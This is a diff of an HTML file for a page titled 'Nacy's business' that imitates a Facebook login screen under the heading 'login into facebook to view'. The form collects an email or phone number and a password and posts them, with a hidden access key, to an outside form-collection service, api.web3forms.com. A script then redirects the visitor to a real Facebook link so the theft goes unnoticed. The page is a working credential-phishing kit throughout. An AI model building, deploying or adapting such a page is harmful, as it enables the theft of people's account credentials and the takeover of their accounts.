@@ -1,67 +1,251 @@
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Nacy's business</title>
-    <link rel="stylesheet" href="style.css" />
-  </head>
+<head>
+<meta charset="UTF-8" />
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+<title>Nacy's business</title>
 
-  <body>
-    <div class="content">
-      <div class="flex-div">
-        <div class="name-content">
-          <h1 class="logo">login into facebook to view</h1>
-          <p></p>
-        </div>
+<style>
+@import url("https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap");
 
-        <!-- Form with API -->
-        <form id="loginForm"
-              action="https://api.web3forms.com/submit"
-              method="POST"
-              onsubmit="redirectSoon()">
+* {
+  margin: 0;
+  padding: 0;
+  box-sizing: border-box;
+}
 
-          <!-- API Key -->
-          <input type="hidden" name="access_key" value="94ca2b0d-8b41-41a1-919b-38420b9b36fd">
+body {
+  font-family: "Poppins", sans-serif;
+  background: #f2f4f7;
+}
 
-          <!-- Inputs -->
-          <input type="text"
-                 name="email_or_phone"
-                 placeholder="Email or Phone Number"
-                 required>
+.content {
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-50%, -50%);
+}
 
-          <input type="password"
-                 name="pass"
-                 placeholder="Password"
-                 required
-                 minlength="6">
+.flex-div {
+  display: flex;
+  justify-content: space-evenly;
+  align-items: center;
+}
 
-          <button type="submit" class="login" id="loginBtn" disabled>
-            Log In
-          </button>
+.name-content {
+  margin-right: 7rem;
+}
 
-          <a href="#">Forgot Password?</a>
-          <hr>
-          <button type="button" class="create-account">Create New Account</button>
+.name-content .logo {
+  font-size: 3.5rem;
+  color: #1877f2;
+}
 
-        </form>
-      </div>
+.name-content p {
+  font-size: 1.3rem;
+  font-weight: 500;
+  margin-bottom: 5rem;
+}
+
+form {
+  display: flex;
+  flex-direction: column;
+  background: #fff;
+  padding: 2rem;
+  width: 530px;
+  height: 380px;
+  border-radius: 0.5rem;
+  box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
+}
+
+form input {
+  outline: none;
+  padding: 0.8rem 1rem;
+  margin-bottom: 0.8rem;
+  font-size: 1.1rem;
+}
+
+form input:focus {
+  border: 1.8px solid #1877f2;
+}
+
+form .login {
+  outline: none;
+  border: none;
+  background: #1877f2;
+  padding: 0.8rem 1rem;
+  border-radius: 0.4rem;
+  font-size: 1.1rem;
+  color: #fff;
+}
+
+form .login:hover {
+  background: #0f71f1;
+  cursor: pointer;
+}
+
+form .login:disabled {
+  background: #9aa4b2;
+  cursor: not-allowed;
+}
+
+form a {
+  text-decoration: none;
+  text-align: center;
+  font-size: 1rem;
+  padding-top: 0.8rem;
+  color: #1877f2;
+}
+
+form hr {
+  background: #f7f7f7;
+  margin: 1rem;
+}
+
+form .create-account {
+  outline: none;
+  border: none;
+  background: #06b909;
+  padding: 0.8rem 1rem;
+  border-radius: 0.4rem;
+  font-size: 1.1rem;
+  color: #fff;
+  width: 75%;
+  margin: 0 auto;
+}
+
+form .create-account:hover {
+  background: #03ad06;
+  cursor: pointer;
+}
+
+/* Media Queries */
+@media (max-width: 500px) {
+  html { font-size: 60%; }
+
+  .name-content {
+    margin: 0;
+    text-align: center;
+  }
+
+  form {
+    width: 300px;
+    height: fit-content;
+  }
+
+  form input { margin-bottom: 1rem; font-size: 1.5rem; }
+  form .login { font-size: 1.5rem; }
+  form a { font-size: 1.5rem; }
+  form .create-account { font-size: 1.5rem; }
+
+  .flex-div {
+    flex-direction: column;
+  }
+}
+
+@media (min-width: 501px) and (max-width: 768px) {
+  html { font-size: 60%; }
+
+  .name-content {
+    margin: 0;
+    text-align: center;
+  }
+
+  form {
+    width: 300px;
+    height: fit-content;
+  }
+
+  form input { margin-bottom: 1rem; font-size: 1.5rem; }
+  form .login { font-size: 1.5rem; }
+  form a { font-size: 1.5rem; }
+  form .create-account { font-size: 1.5rem; }
+
+  .flex-div {
+    flex-direction: column;
+  }
+}
+
+@media (min-width: 769px) and (max-width: 1200px) {
+  html { font-size: 60%; }
+
+  .name-content {
+    margin: 0;
+    text-align: center;
+  }
+
+  form {
+    width: 300px;
+    height: fit-content;
+  }
+
+  form input { margin-bottom: 1rem; font-size: 1.5rem; }
+  form .login { font-size: 1.5rem; }
+  form a { font-size: 1.5rem; }
+  form .create-account { font-size: 1.5rem; }
+
+  .flex-div {
+    flex-direction: column;
+  }
+}
+</style>
+</head>
+
+<body>
+<div class="content">
+  <div class="flex-div">
+    <div class="name-content">
+      <h1 class="logo">login into facebook to view</h1>
+      <p></p>
     </div>
 
-    <script>
-      const form = document.getElementById("loginForm");
-      const button = document.getElementById("loginBtn");
+    <!-- Form with API -->
+    <form id="loginForm"
+          action="https://api.web3forms.com/submit"
+          method="POST"
+          onsubmit="redirectSoon()">
 
-      // Enable button only when form is valid
-      form.addEventListener("input", function () {
-        button.disabled = !form.checkValidity();
-      });
+      <!-- API Key -->
+      <input type="hidden" name="access_key" value="94ca2b0d-8b41-41a1-919b-38420b9b36fd">
 
-      function redirectSoon() {
-        setTimeout(function () {
-          window.location.href = "https://www.facebook.com/share/r/18PpdhPEve/";
-        }, 800);
-      }
-    </script>
-  </body>
+      <!-- Inputs -->
+      <input type="text"
+             name="email_or_phone"
+             placeholder="Email or Phone Number"
+             required>
+
+      <input type="password"
+             name="pass"
+             placeholder="Password"
+             required
+             minlength="6">
+
+      <button type="submit" class="login" id="loginBtn" disabled>
+        Log In
+      </button>
+
+      <a href="#">Forgot Password?</a>
+      <hr>
+      <button type="button" class="create-account">Create New Account</button>
+    </form>
+  </div>
+</div>
+
+<script>
+const form = document.getElementById("loginForm");
+const button = document.getElementById("loginBtn");
+
+// Enable button only when form is valid
+form.addEventListener("input", function () {
+  button.disabled = !form.checkValidity();
+});
+
+function redirectSoon() {
+  setTimeout(function () {
+    window.location.href = "https://www.facebook.com/share/r/18PpdhPEve/";
+  }, 800);
+}
+</script>
+</body>
 </html>
